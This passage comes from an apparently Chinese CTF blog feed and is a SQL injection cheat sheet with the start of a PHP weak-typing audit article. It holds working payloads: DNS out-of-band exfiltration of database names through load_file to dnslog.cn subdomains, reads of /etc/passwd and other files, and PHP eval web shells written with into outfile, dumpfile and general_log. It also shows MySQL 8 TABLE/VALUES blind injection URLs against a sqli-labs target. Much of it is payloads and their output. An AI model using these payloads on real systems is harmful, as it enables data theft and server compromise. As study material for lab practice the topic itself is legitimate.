title="爆错盲注"></a>爆错盲注</h2><p>这里参考上文爆错注入即可，区别就是这个可能无法回显出数据，但是成功与失败页面可能存在差异，可以利用这个差异去编写脚本进行判断</p><h2 id="当关键词被过滤使用异或注入代替"><a href="#当关键词被过滤使用异或注入代替" class="headerlink" title="当关键词被过滤使用异或注入代替"></a>当关键词被过滤使用异或注入代替</h2><p>当and和or被过滤的时候，我们可以用异或注入然后搭配上面三个去代替，本质上是一样的。</p><h1 id="DNS请求注入"><a href="#DNS请求注入" class="headerlink" title="DNS请求注入"></a>DNS请求注入</h1><p><strong>DNS平台:</strong></p><pre><code class="python">http://www.dnslog.cnhttp://ceye.io</code></pre><p><strong>DNS注入原理:</strong></p><pre><code class="python">dnslog注入也可以称之为dns带外查询，是一种注入姿势，可以通过查询相应的dns解析记录，来获取我们想要的数据在无法通过联合查询直接获取数据时，只能通过盲注，来一步步的获取数据，手工测试是需要花费大量的时间，使用sqlmap直接去跑出数据，但是有很大的几率，网站把ip给封掉，这就影响了测试进度</code></pre><p><strong>前提条件:</strong></p><pre><code class="python">dns带外查询属于MySQL注入在MySQL中有个系统属性，secure_file_priv特性，有三种状态secure_file_priv为null    表示不允许导入导出secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹secure_file_priv没有设置时，则表示没有任何限制</code></pre><p>我们要让secure_file_priv没有任何限制才能注入成功，我们这里本地搭建环境<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666950864657-b85a2de5-e3fc-4ce0-9f8b-b72c284a16c0.png" alt="image.png"><br>让这里为空<br><strong>相关函数:</strong></p><pre><code class="python">LOAD_FILE()函数读取一个文件并将其内容作为字符串返回语法：load_file(文件的完整路径）此函数使用需要满足的条件要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet。如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。而且LOAD_FILE()函数不仅能够加载本地文件，同时也能对诸如\\www.test.com这样的UNCurl发起请求。</code></pre><pre><code class="python">UNC是一种命名惯例，主要用于在Microsoft Windows上指定和映射网络驱动器。UNC命名惯例最多被应用于局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。UNC路径就是类似\softer这样的形式的网络路径。格式:\servername\sharename，其中servername是服务器名，sharename是共享资源的名称。</code></pre><p><strong>构造注入语句:</strong></p><pre><code class="python">（根据实际情况构造）select load_file(concat(&#39;//&#39;,(select database()),&#39;.oo0fjh.dnslog.cn/abc&#39;))select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.oo0fjh.dnslog.cn\\123&#39;))load_file()函数访问的是文件，所以域名后面需要添加/abc</code></pre><p>我们来执行一下语句:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666950895154-7656141c-8ec3-42c7-8ecc-679b1e24e3cc.png" alt="image.png"><br>如图，这里的security就是我们的数据库名称<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666950920936-b77db3b3-5bfd-4054-8d64-d2d29e45c628.png" alt="image.png"></p><h1 id="mysql关于utf-8编码问题"><a href="#mysql关于utf-8编码问题" class="headerlink" title="mysql关于utf-8编码问题"></a><strong>mysql关于utf-8编码问题</strong></h1><p>如果数据库是utf-8编码的情况下，常常会在PHP代码层用无视大小写的字母waf，那么utf-8的<br>是无法像GBK用宽字节绕过 ‘ ，但是在数据库中utf-8分为2种校对模式<br>utf8_unicode_ci<br>该模式会把特殊字母转换成2个正规英文，例如ß=ss<br>utf8_general_ci<br>该模式会把特殊字符转换成1个正规英文，例如Ä = A，Ö = O，Ü = U<br>比如是utf8_general_ci模式，下面是$sql1会被拦截，而$sql2不会被拦截</p><pre><code class="python">$sql1 = select * from admin where id = &#39;xx&#39; union select 1,2,database() #$sql2 = select * from admin where id = &#39;xx&#39; uniÖn select 1,2,database() #if(preg_match(&#39;/union/i&#39;,$sql1) &gt; 0)&#123;　　echo &#39;waf&#39;;&#125;else&#123;　　执行sql语句&#125;if(preg_match(&#39;/union/i&#39;,$sql2) &gt; 0)&#123;　　echo &#39;waf&#39;;&#125;else&#123;　　执行sql语句&#125;</code></pre><h1 id="sql注入读取文件"><a href="#sql注入读取文件" class="headerlink" title="sql注入读取文件"></a>sql注入读取文件</h1><h2 id="load-file读取文件"><a href="#load-file读取文件" class="headerlink" title="load_file读取文件"></a>load_file读取文件</h2><p><strong>文件读取基本条件:</strong></p><pre><code class="python">当前用户权限对该文件可读。文件在该服务器上。路径完整。文件大小小于max_sllowed_packet。当前数据库用户有FILE权限，File_priv为yessecure_file_priv的值为空，如果值为某目录，那么就只能对该目录的文件进行操作。</code></pre><p><strong>查看secure_file_priv</strong></p><pre><code class="python"> show variables like &#39;%secure%&#39;;</code></pre><pre><code class="python">在MySQL中有个系统属性，secure_file_priv特性，有三种状态secure_file_priv为null    表示不允许导入导出secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹secure_file_priv没有设置时，则表示没有任何限制</code></pre><p>如果这个为null我们是无法读取文件的<br><strong>读取文件命令:</strong><br>*<em>注意路径问题，是/而不能是*</em></p><pre><code class="python">mysql&gt; select load_file(&#39;E:/phpstudy_pro/WWW/flag.txt&#39;);+--------------------------------------------------------------------------------------+| load_file(&#39;E:/phpstudy_pro/WWW/flag.txt&#39;)                                            |+--------------------------------------------------------------------------------------+| 0x666C61677B746869735F31735F66316161616161677D                                       |+--------------------------------------------------------------------------------------+1 row in set (0.00 sec)</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666976308164-9d325d8d-5c1d-4cb0-866d-26860e656f36.png" alt="image.png"><br>当我们使用SQL注入来进行文件读写时，还需要注意，在网站的PHP设置中是否使用了magic_quotes_gpc的魔术引导开关，该参数的设置会对单引号、双引号、反斜杠与空字符进行过滤。这样，当我们使用MySQL进行文件读写，要输入目标站点路径时，就会受到限制。针对这一点，<strong>我们可以使用16进制编码的方式来进行绕过。</strong></p><pre><code class="python">mysql&gt; select load_file(0x453A2F70687073747564795F70726F2F5757572F666C61672E747874);+----------------------------------------------------------------------------------------------------------------------------------------------+| load_file(0x453A2F70687073747564795F70726F2F5757572F666C61672E747874)                                                  |+----------------------------------------------------------------------------------------------------------------------------------------------+| 0x666C61677B746869735F31735F66316161616161677D                                                  |+----------------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)</code></pre><h2 id="Load-data-infile读取文件"><a href="#Load-data-infile读取文件" class="headerlink" title="Load data infile读取文件"></a>Load data infile读取文件</h2><p>当”LOAD DATA local INFILE”时出现The used command is not allowed with this MySQL version问题时<br>第一是版本确实过低，低于5.0，但是现在基本不可能出现这个问题。<br>第二可能是本地导入文件的参数没有打开。<br>我们输入:</p><pre><code class="python">mysql&gt; SHOW VARIABLES LIKE &#39;%local%&#39;;+---------------+-------+| Variable_name | Value |+---------------+-------+| local_infile  | OFF    |+---------------+-------+1 row in set, 1 warning (0.00 sec)</code></pre><p>发现雀氏没打开哦<br>我们再输入:</p><pre><code class="python">SET GLOBAL local_infile=1;</code></pre><p>读取文件payload:</p><pre><code class="python">load data infile &quot;/etc/passwd&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;</code></pre><p>这里我本地复现失败了，我就放一张别人的图吧，qaq<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666978978256-35acea7a-b8ea-4f25-9ced-6f2d914ec6a8.png" alt="图片-26.png"></p><h1 id="sql注入写shell"><a href="#sql注入写shell" class="headerlink" title="sql注入写shell"></a>sql注入写shell</h1><h2 id="into-outfile-写文件"><a href="#into-outfile-写文件" class="headerlink" title="into outfile()写文件"></a>into outfile()写文件</h2><p>写入一句话payload:</p><pre><code class="python">select &#39;&lt;?php eval($_POST[cmd]?&gt;&#39; into outfile &#39;E:/phpstudy_pro/WWW/xx.php&#39;;</code></pre><pre><code class="python">mysql&gt; select &#39;&lt;?php eval($_POST[cmd]?&gt;&#39; into outfile &#39;E:/phpstudy_pro/WWW/xx.php&#39;;Query OK, 1 row affected (0.00 sec)</code></pre><p>写入的数据可以用16进制代替，但是 outfile后面不能接Ox开头或者char转换以后的路径，只能是单引号路径。这个问题在php注入中更加麻烦，因为会自动将单引号转义,那么基本没的玩了。  </p><pre><code class="python">select 0x3C3F706870206576616C28245F504F53545B636D645D3F3E into outfile &#39;E:/phpstudy_pro/WWW/xx.php&#39;;</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1666979808674-b35c4b47-d186-436f-80ab-63031277162c.png" alt="image.png"><br>写入shell成功!</p><h2 id="into-dumpfile-写文件"><a href="#into-dumpfile-写文件" class="headerlink" title="into dumpfile()写文件"></a>into dumpfile()写文件</h2><p>into dumpfile只能导出第一行数据，并不常用，通常写入第二条数据的时候出错，但第二条内容已被写入文件</p><pre><code class="python">select &#39;&lt;?php eval($_POST[cmd]?&gt;&#39; into dumpfile &#39;D:/HY.php&#39;</code></pre><p>写入的数据可以用16进制代替</p><pre><code class="python">select 0x3C3F706870206576616C28245F504F53545B636D645D3F3E into dumpfile &#39;E:/phpstudy_pro/WWW/xx.php&#39;;</code></pre><h2 id="两者区别"><a href="#两者区别" class="headerlink" title="两者区别"></a>两者区别</h2><p>into dumpfile它只能导出一行数据，并不常用，用于导出一条数据，通常写入第二条的时候出错，但第二条内容已被写入文件。<br>outfile函数可以导出多行，而dumpfile只能导出一行数据。<br>outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式。<br>dumpfile适用于二进制文件，它会将目标文件吸入同一行内; outfile则更适用于文本文件。</p><h2 id="日志写shell"><a href="#日志写shell" class="headerlink" title="日志写shell"></a>日志写shell</h2><pre><code class="python">MySQL日志文件系统的组成:错误日志log_error：记录启动、运行或停止mysqld时出现的问题。通用日志general_log：记录建立的客户端连接和执行的语句。更新日志：记录更改数据的语句。该日志在MySQL 5.1中已不再使用。二进制日志：记录所有更改数据的语句。还用于复制。慢查询日志slow_query_log：记录所有执行时间超过long_query_time秒(默认10秒)的所有查询或不使用索引的查询。Innodb日志：innodb redolog</code></pre><p> 以下举例两种:</p><pre><code class="python">show global variables like &quot;%general%&quot;;                 #查看general文件配置情况set global general_log=&#39;on&#39;;                            #开启日志记录set global general_log_file=&#39;C:/phpstudy/WWW/shell.php&#39;;select &#39;&lt;?php @eval($_POST[shell]); ?&gt;&#39;;                #日志文件导出指定目录set global general_log=off;                             #关闭记录</code></pre><pre><code class="python">show variables like &#39;%slow%&#39;;                           #慢查询日志set GLOBAL slow_query_log_file=&#39;C:/phpStudy/PHPTutorial/WWW/slow.php&#39;;set GLOBAL slow_query_log=on;/*set GLOBAL log_queries_not_using_indexes=on;show variables like &#39;%log%&#39;;*/select &#39;&lt;?php phpinfo();?&gt;&#39; from mysql.user where sleep(10);</code></pre><h1 id="Mysql任意文件读取"><a href="#Mysql任意文件读取" class="headerlink" title="Mysql任意文件读取"></a>Mysql任意文件读取</h1><p>这个解释起来比较多，放个参考链接<br><a href="https://www.yuque.com/docs/share/8ccbaba4-6b65-492e-9a5d-642609c5823b#">https://www.yuque.com/docs/share/8ccbaba4-6b65-492e-9a5d-642609c5823b?#</a> 《MySQL客户端任意文件读取》</p><h1 id="MYSQL8-0注入新特性"><a href="#MYSQL8-0注入新特性" class="headerlink" title="MYSQL8.0注入新特性"></a>MYSQL8.0注入新特性</h1><p>MYSQL8.0.19后 出现两个新的关键字table和values  </p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置:"></a>环境配置:</h2><p>** 选择使用docker搭建:**</p><pre><code class="python">docker pull mysql:8.0.22docker run -itd -p 3306:3306 -e MYSQL_ROOT_PASSWORD=HY666123 mysql:8.0.22# 进去docker容器docker exec -it 410b0261fe70 bash# 登陆mysqlmysql -u root -pHY666123# 开启远程访问权限use mysql;select host,user from user;# 因为mysql8.0默认认证方式和5不一样，通过下面语句修改即可ALTER USER &#39;root&#39; IDENTIFIED WITH mysql_native_password BY &#39;HY666123&#39;;flush privileges;</code></pre><p>我们来远程连接一下:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667118176379-90035b23-4012-4ead-af9d-87fe3e093804.png" alt="image.png"><br>成功连接上去了<br><strong>sql注入的靶场用sqli-lab</strong><br><a href="https://github.com/c0ny1/vulstudy">https://github.com/c0ny1/vulstudy</a><br>按照文档搭建好，进入容器修改sqli-lab的配置文件</p><pre><code class="python"># 启动容器docker-compose up -d# 进入sql-labs容器docker exec -it e0c30b42806f bash# 编辑文件vi /app/sql-connections/db-creds.inc# 配置文件#数据库的IP填宿主机的就可以，通过ifconfig查看容器IP地址#比如容器IP为：172.18.0.2，一般来说宿主机为172.18.0.1&lt;?php//give your mysql connection username n password$dbuser =&#39;root&#39;;$dbpass =&#39;HY666123&#39;;$dbname =&quot;security&quot;;$host = &#39;172.18.0.1&#39;;$dbname1 = &quot;challenges&quot;;?&gt;# 重启docker容器docker restart e0c30b42806f</code></pre><p>搞了好久，终于搭建好了，md<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121281615-4e12879b-9bf6-4456-94b3-3163f4079709.png" alt="image.png"></p><h2 id="table"><a href="#table" class="headerlink" title="table"></a>table</h2><p><strong>基本用法</strong><br>在MYSQL8以后出现的新语法，作用和select类似。</p><pre><code class="python">作用：列出表中全部内容语法：TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121671251-06a4a33b-5ac5-41a5-a73a-f9c81a8d1154.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121711905-0c346772-77f6-4421-9450-fc7634d6d66b.png" alt="image.png"><br><strong>支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。</strong></p><pre><code class="python">table user order by 2table user limit 2</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121769501-851d711d-14c6-44bb-bb9a-cdc1b8244c34.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667121789469-1d020011-3434-4884-b299-d9c70668b6a0.png" alt="image.png"><br><strong>与SELECT的区别：</strong></p><pre><code class="python">1.TABLE始终显示表的所有列 2.TABLE不允许对行进行任意过滤，即TABLE 不支持任何WHERE子句</code></pre><p><strong>注意事项:</strong><br><strong>比较问题一:</strong><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667122326816-e2d3588e-7b50-42aa-9d51-55072e2495f6.png" alt="image.png"><br>我们来构造sql语句:</p><pre><code class="python">mysql&gt; select ((&#39;r&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));        +------------------------------------------------------------------------+                   | ((&#39;r&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |                   +------------------------------------------------------------------------+                   |                                                                      1 |                   +------------------------------------------------------------------------+                   1 row in set (0.24 sec)                                                                                                                                                                   mysql&gt; select ((&#39;t&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));        +------------------------------------------------------------------------+                   | ((&#39;t&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |                   +------------------------------------------------------------------------+                   |                                                                      0 |                   +------------------------------------------------------------------------+                   1 row in set (0.23 sec)                                                                      </code></pre><p>这里看起来和以前一样，但是当我们换为s时:</p><pre><code class="python">mysql&gt; select ((&#39;s&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));+------------------------------------------------------------------------+| ((&#39;s&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |+------------------------------------------------------------------------+|                                                                      1 |+------------------------------------------------------------------------+1 row in set (0.23 sec)</code></pre><p>同样为1，说明当ascii相等的时候返回1<br><strong>所以在进行注入中注意要把得到的数ascii值减1。</strong><br><strong>比较问题二</strong></p><pre><code class="python">mysql&gt; select ((&#39;security/user&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));+------------------------------------------------------------------------------------+| ((&#39;security/user&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |+------------------------------------------------------------------------------------+|                                                                                  1 |+------------------------------------------------------------------------------------+1 row in set (0.23 sec)mysql&gt; select ((&#39;security/users&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));+-------------------------------------------------------------------------------------+| ((&#39;security/users&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |+-------------------------------------------------------------------------------------+|                                                                                NULL |+-------------------------------------------------------------------------------------+1 row in set (0.23 sec)mysql&gt; select ((&#39;security/usert&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1));+-------------------------------------------------------------------------------------+| ((&#39;security/usert&#39;,&#39;&#39;)&lt;(table information_schema.TABLESPACES_EXTENSIONS limit 6,1)) |+-------------------------------------------------------------------------------------+|                                                                                   0 |+-------------------------------------------------------------------------------------+1 row in set (0.23 sec)</code></pre><p>当前面字符串相等时，会比较最后一位，当完全相等时，返回NULL<br><strong>比较问题三</strong><br>整数比较问题</p><pre><code class="python">mysql&gt; select ((&#39;0&#39;,2,3)&lt;(table users limit 0,1));+-------------------------------------+| ((&#39;0&#39;,2,3)&lt;(table users limit 0,1)) |+-------------------------------------+|                                   1 |+-------------------------------------+1 row in set (0.23 sec)mysql&gt; select ((&#39;1&#39;,2,3)&lt;(table users limit 0,1));+-------------------------------------+| ((&#39;1&#39;,2,3)&lt;(table users limit 0,1)) |+-------------------------------------+|                                   0 |+-------------------------------------+1 row in set (0.23 sec)mysql&gt; select ((&#39;2&#39;,2,3)&lt;(table users limit 0,1));+-------------------------------------+| ((&#39;2&#39;,2,3)&lt;(table users limit 0,1)) |+-------------------------------------+|                                   0 |+-------------------------------------+1 row in set (0.23 sec)mysql&gt; select ((&#39;0aa&#39;,2,3)&lt;(table users limit 0,1));+---------------------------------------+| ((&#39;0aa&#39;,2,3)&lt;(table users limit 0,1)) |+---------------------------------------+|                                     1 |+---------------------------------------+1 row in set, 1 warning (0.23 sec)mysql&gt; select ((&#39;1aa&#39;,2,3)&lt;(table users limit 0,1));+---------------------------------------+| ((&#39;1aa&#39;,2,3)&lt;(table users limit 0,1)) |+---------------------------------------+|                                     0 |+---------------------------------------+1 row in set, 1 warning (0.23 sec)</code></pre><p> 在这里，由于id是整型，当我们输入的是字符型时，在进行比较过程中，字符型会被强制转换为整型，而不是像之前一样读到了第一位以后没有第二位就会停止，也就是都会强制转换为整型进行比较并且会一直持续下去，所以以后写脚本当跑到最后一位的时候尤其需要注意。  </p><h2 id="VALUES"><a href="#VALUES" class="headerlink" title="VALUES"></a>VALUES</h2><p>VALUES 类似于其他数据库的 ROW 语句，造数据时非常有用。   </p><pre><code class="python">作用：列出一行的值语法：VALUES row_constructor_list[ORDER BY column_designator][LIMIT BY number] row_constructor_list:   ROW(value_list)[, ROW(value_list)][, ...]value_list:   value[, value][, ...]column_designator:   column_index</code></pre><p> 基本使用:</p><pre><code class="python">VALUES ROW(1,2)VALUES ROW(1,2,3)VALUES ROW(1,2,3),ROW(5,6,7)</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667123148793-3de4ecc3-8810-43ea-a5c9-39db2ae76870.png" alt="image.png"><br> 配合union使用:</p><pre><code class="python">VALUES ROW(1, 2) union select * from userselect * from user union VALUES ROW(1, 2)</code></pre><h2 id="information-schema-TABLESPACES-EXTENSIONS"><a href="#information-schema-TABLESPACES-EXTENSIONS" class="headerlink" title="information_schema.TABLESPACES_EXTENSIONS"></a>information_schema.TABLESPACES_EXTENSIONS</h2><pre><code class="python"># 我们可以通过这个表去查询所有数据库中的数据库和数据表table information_schema.TABLESPACES_EXTENSIONS等价于select * from information_schema.TABLESPACES_EXTENSIONS</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667123264265-97f7586f-c68d-4aa4-ae44-40a7f37126e1.png" alt="image.png"><br>类似的还有:</p><pre><code class="python">information_schema.SCHEMA information_schema.TABLESinformation.COLUMNSmysql.innodb_table_statsmysql.innodb_index_statssys.schema_tables_with_full_table_scans</code></pre><h2 id="简单练手"><a href="#简单练手" class="headerlink" title="简单练手"></a>简单练手</h2><p> 修改Less-1的代码，过滤select </p><pre><code class="python">&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variables if(isset($_GET[&#39;id&#39;]))&#123;$id=$_GET[&#39;id&#39;];//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity function blacklist($id)&#123;    $id= preg_replace(&#39;/select/i&#39;,&quot;&quot;, $id);    return $id;&#125;$id = blacklist($id);$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);    if($row)    &#123;    echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;    echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];    echo &quot;&lt;br&gt;&quot;;    echo &#39;Your Password:&#39; .$row[&#39;password&#39;];    echo &quot;&lt;/font&gt;&quot;;    &#125;    else     &#123;    echo &#39;&lt;font color= &quot;#FFFF00&quot;&gt;&#39;;    print_r(mysql_error());    echo &quot;&lt;/font&gt;&quot;;      &#125;&#125;    else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-1.jpg&quot; /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667123953628-7cea2c7a-0067-4ed6-86b4-2927530d781e.png" alt="image.png"><br>我们来用新方法注入:<br>首先用order by判断列数，这里不再说明，得出三列</p><pre><code class="python"># 我们使用values构造出了一个表,证明可以注入http://193.43.142.8/Less-1/?id=-1&#39;union values row(1,2,3)--+</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667124020361-65981ef9-1171-4f96-804d-18ed8ff66a3f.png" alt="image.png"><br>然后就是常规的需要知道库名，表名，字段名<br>当前库可以通过布尔盲注得到</p><pre><code class="python">http://193.43.142.8/Less-1/?id=1&#39;and if((substr((database()),1,1)=&#39;s&#39;),1,0)--+</code></pre><p> 别的库名可以通过盲注得到  </p><pre><code class="python">table information_schema.schemata       #列出所有数据库名</code></pre><p> 因为table不能像select控制列数，除非列数一样的表，不然都回显不出来，也需要使用盲注<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1667124802009-d36dcc05-5439-472c-abf9-0c338284016a.png" alt="image.png"></p><pre><code class="python">http://193.43.142.8/Less-1/?id=1&#39;&amp;&amp;(&#39;def&#39;,&#39;m&#39;,&#39;&#39;,4,5,6)&lt;(table information_schema.schemata limit 1);</code></pre><p>后面的语句是从左到右判断的，第一列判断正确再判断第二列<br>因为schemata表中的第一列是def，不需要判断，所以可以直接判断库名<br>里面的字符也是单个判断的，比如库为mysql</p><pre><code class="python">m &lt; mysqlmy &lt; mysqlazzzz &lt; mysql</code></pre><p>以上判断都是正确的，猜测是按照ascii码大小比较的，最后一个就比较坑，如果前一个字符判断不正确，后面的字符都会不正确，所以前面的判断一定要正确<br>注意判断的时候后一个列名一定要用字符表示，不能用数字，不然判断到前一个最后一个字符会判断不出</p><pre><code class="python">(&#39;def&#39;,&#39;mysql&#39;,3,4,5,6)&lt;(table information_schema.schemata limit 1);    #判断错误(&#39;def&#39;,&#39;mysql&#39;,&#39;&#39;,4,5,6)&lt;(table information_schema.schemata limit 1);   #判断正确</code></pre><p> 得到当前库名为security，接下来判断表名  </p><pre><code class="python">(&#39;def&#39;,&#39;security&#39;,&#39;&#39;,&#39;&#39;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;(table information_schema.tables limit 325,1);</code></pre><p>前两个字段都是确定的，可以写一个for循环判断，如果结果为真，代表从那行开始，然后盲注第三个列<br>得到所有表明后开始判断字段名，找到columns表，具体方法和上面一样</p><pre><code class="python">(&#39;def&#39;,&#39;security&#39;,&#39;users&#39;,&#39;&#39;,&#39;&#39;,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;(table information_schema.columns limit 3415,1);</code></pre><p> 最后注入出数据  </p><pre><code class="python">(1,&#39;&#39;,&#39;&#39;) &lt; (table users limit 1);</code></pre><p>这里有个坑点，如果没有得到数据类型的话还是需要猜的，比如ID为1，前面就不能写成’1’<br>然后一直往下注入数据就行了</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接:"></a>参考链接:</h1><p><a href="https://www.cnblogs.com/phant0m/articles/16450646.html">https://www.cnblogs.com/phant0m/articles/16450646.html</a><br><a href="https://blog.csdn.net/weixin_49150931/article/details/111829828">https://blog.csdn.net/weixin_49150931/article/details/111829828</a><br><a href="https://blog.csdn.net/qq_53079406/article/details/125285625">https://blog.csdn.net/qq_53079406/article/details/125285625</a><br><a href="https://xz.aliyun.com/t/8646">https://xz.aliyun.com/t/8646</a><br><a href="https://blog.csdn.net/qq_38154820/article/details/121369208">https://blog.csdn.net/qq_38154820/article/details/121369208</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php代码审计总结</title>
      <link href="/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/"/>
      <url>/2022/11/22/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="php弱类型比较"><a href="#php弱类型比较" class="headerlink" title="php弱类型比较"></a>php弱类型比较</h2><h3 id="弱类型与强类型"><a href="#弱类型与强类型" class="headerlink" title="弱类型与强类型"></a>弱类型与强类型</h3><p>通常语言有强类型和弱类型两种，强类型指的是强制数据类型的语言，就是说，一个变量一旦被定义了某个类型，如果不经过强制类型转换，这个变量就一直是这个类型，在变量使用之前必须声明变量的类型和名称，且不经强制转换不允许两种不同类型的变量互相操作。我们称之为强类型，而弱类型可以随意转换变量的类型例如可以这样：</p><pre><code class="php">$text=1;$text=”string”</code></pre><p>也就是说php并不会验证变量的类型，可以随时的转换类型，估计开发者的意图是让程序员可以进行更高效的开发，所以在大量内置函数以及基本结构中使用了很多松散的比较和转换，防止程序中的变量因为程序员的不规范而报错，虽然提升了效率，但是引发了很多安全问题。<br>类型转换问题<br>类型转换最常见的就是int转String,String转int。<br><strong>Int转String:</strong><br>$num = 5;<br>方式1：item=(string)num;<br>方式2：item=strval(num);<br><strong>String转int:</strong><br>intval() 函数。(取整函数)<br>主要问题就出现在这个intval()函数上了。<br><strong>例子：</strong></p><pre><code class="php">var_dump(intval(4))//4var_dump(intval(‘1asd’))//1var_dump(intval(‘asd1’))//0</code></pre><p>上面三个例子说明了intval（）函数在转换字符串的时候即使碰到不能转换的字符串的时候它也不会报错，而是返回0。</p><pre><code class="php">&lt;?phpif($_GET[id]) &#123;    mysql_connect(SAE_MYSQL_HOST_M . &#39;:&#39; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);    mysql_select_db(SAE_MYSQL_DB);    $id = intval($_GET[id]);    $query = @mysql_fetch_array(mysql_query(&quot;select content from ctf2 where id=&#39;$id&#39;&quot;));    if ($_GET[id]==1024) &#123;        echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;    &#125;    else&#123;         echo($query[content]);      &#125;&#125;?&gt;</code></pre><p>本题输入1024.1即可绕过</p><h3 id="与"><a href="#与" class="headerlink" title="==与==="></a>==与===</h3><p><strong>php是一种弱类型语言，对数据的类型要求并不严格，可以让数据类型互相转换。</strong><br> 在php中有两种比较符号: 一种是 ==，另外一种是 ===，都是用来比较两个数值是否相等的操作符，但他们也是有区别的:  </p><ol><li>== ：弱等于。在比较前会先把两种字符串类型转成相同的再进行比较。简单的说，它不会比较变量类型，只比较值。</li><li>=== ：强等于。在比较前会先判断两种字符串类型是否相同再进行比较，如果类型不同直接返回不相等。既比较值也比较类型</li></ol><p><strong>转换规则：</strong><br>1.若一个数字和一个字符串进行比较或者进行运算时，PHP会把字符串转换成数字再进行比较。<br>若字符串以数字开头，则取开头数字作为转换结果，不能转换为数字的字符串（例如”aaa”是不能转换为数字的字符串，而”123”或”123aa”就是可以转换为数字的字符串）或null，则转换为0；<br>例如:  </p><pre><code class="php"> var_dump(12==&quot;12&quot;)                                   // true var_dump(12==&quot;12aa&quot;)                              //true var_dump( 